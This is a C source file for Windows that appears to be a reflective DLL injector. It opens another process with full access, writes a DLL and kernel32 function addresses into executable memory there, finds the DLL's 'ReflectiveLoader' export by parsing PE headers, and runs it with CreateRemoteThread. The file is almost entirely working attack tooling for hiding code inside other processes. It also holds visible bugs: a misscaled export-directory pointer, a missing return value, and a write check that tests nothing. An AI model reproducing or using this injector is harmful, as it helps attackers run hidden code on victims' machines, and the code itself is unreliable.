#include <windows.h>
#include <stdio.h>

BYTE* getFileBytes(char* path, DWORD* fileSize){
    HANDLE hFile = NULL;
    DWORD dwFileSize = 0;
    BYTE* fileBuffer = NULL;
    hFile = CreateFileA(
        path,
        GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE){
        printf("[!] Error opening file! %d", GetLastError());
        return NULL;
    }
    
    dwFileSize = GetFileSize(hFile, NULL);
    if(dwFileSize == INVALID_FILE_SIZE){
        printf("[!] Error getting file size! %d", GetLastError());
        return NULL;
    }
    *fileSize = dwFileSize;
    fileBuffer = (BYTE*) malloc(dwFileSize + 1);
    if (!fileBuffer){
        printf("[!] Error allocating memory for file bytes!");
        return NULL;
    }

    if (!ReadFile(hFile, fileBuffer, dwFileSize, NULL, NULL)){
        printf("[!] Error reading file bytes!");
        free(fileBuffer);
        return NULL;
    }

    fileBuffer[dwFileSize] = '\0';

    printf("[+] Loaded file bytes successfully!\n");
    return fileBuffer;
}

DWORD Rva2Offset( DWORD dwRva, UINT_PTR uiBaseAddress )
{    
	WORD wIndex                          = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders         = NULL;
	
	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

    if( dwRva < pSectionHeader[0].PointerToRawData )
        return dwRva;

    for( wIndex=0 ; wIndex < pNtHeaders->FileHeader.NumberOfSections ; wIndex++ )
    {   
        if( dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData) )           
           return ( dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData );
    }
    
    return 0;
}

DWORD FindRVA(BYTE* pe, char* name){
    //we need to get to the export table:
    //DOS Header -> NT Headers -> Optional Headers -> data dir -> image entry point dir
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER) pe; 
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS) (dosHeader->e_lfanew + (UINT_PTR) pe);
    IMAGE_OPTIONAL_HEADER optionalHeader = ntHeaders->OptionalHeader; 
    PIMAGE_DATA_DIRECTORY dataDir = optionalHeader.DataDirectory;
    IMAGE_DATA_DIRECTORY exportDirEntry = dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY) pe + Rva2Offset(exportDirEntry.VirtualAddress, (UINT_PTR) pe);
    DWORD* functions = (DWORD*) ((UINT_PTR) pe + Rva2Offset(exportDir->AddressOfFunctions, (UINT_PTR) pe));
    DWORD* names = (DWORD*) ((UINT_PTR) pe + Rva2Offset(exportDir->AddressOfNames, (UINT_PTR) pe));
    DWORD numNames = exportDir->NumberOfNames;
    //walk names
    for(int i = 0; i < numNames; i++){
        if(!functions[i]){
            printf("skipping null named function");
        }
        char* fName = (char*) pe + Rva2Offset(names[i], (UINT_PTR) pe);
        printf("found function: %s", fName);
        if(!strcmp(fName, name)){
            printf("[+] Found target function in portable executable...");
            return Rva2Offset(functions[i], (UINT_PTR) pe);
        } 
    }
}

int main(int argc, char* argv[]){
    DWORD pid = 0;
    BYTE* fileBytes = NULL;
    DWORD fileSize = 0;
    if (argc < 3){
        printf("Usage: %s <pid> <path_to_dll> \n", argv[0]);
        return 1;
    }
    pid = atoi(argv[1]);
    fileBytes = getFileBytes(argv[2], &fileSize);
    if (!fileBytes){
        printf("[!] Error getting file bytes, exiting...");
        return 1;
    }
    //find our target process
    HANDLE targetProc;
    targetProc = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );
    if(!targetProc){
        printf("[!] Error opening process!");
        return 1;
    }
    //allocate memory for our file bytes buffer
    LPVOID baseAddr = VirtualAllocEx(
        targetProc, 
        NULL,
        fileSize,
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    //inject our bytes into the target process
    if(!WriteProcessMemory(
        targetProc, 
        baseAddr,
        fileBytes,
        fileSize,
        NULL
    ));
    //lets get addresses of our needed functions and pass them to the reflectiveloader:
    //we need virtualallocex, getprocaddress, virtualprotect, and loadlibraryA
    HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
    FARPROC addrVirtualAllocEx = GetProcAddress(hkernel32, "VirtualAllocEx");
    FARPROC addrGetProcAddress = GetProcAddress(hkernel32, "GetProcAddress");
    FARPROC addrVirtualProtect = GetProcAddress(hkernel32, "VirtualProtect");
    FARPROC addrLoadLibraryA   = GetProcAddress(hkernel32, "LoadLibraryA");
    UINT_PTR modules[4] = {
        (UINT_PTR) addrGetProcAddress, 
        (UINT_PTR) addrLoadLibraryA, 
        (UINT_PTR) addrVirtualAllocEx, 
        (UINT_PTR) addrVirtualProtect
    };
    //write our modules into the process
    LPVOID modulesAddr = VirtualAllocEx(
        targetProc,
        NULL,
        sizeof(modules),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!modulesAddr){
        printf("[!] Error allocating memory for modules!");
        return 1;        
    }
    if (!WriteProcessMemory(targetProc, modulesAddr, modules, sizeof(modules), NULL)){
        printf("[!] Error writing modules into target process!");
    }
    //locate where the RVA of the reflectiveloader exported function
    DWORD RVA = (DWORD)FindRVA(fileBytes, "ReflectiveLoader");
    //pass execution to the reflective loader
    HANDLE hThread = CreateRemoteThread(
        targetProc,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)(RVA + (UINT_PTR)baseAddr),
        modulesAddr,
        0,
        NULL
    );
    WaitForSingleObject(hThread, INFINITE);
    FreeLibrary(hkernel32);
    free(fileBytes);
    return 0;
}


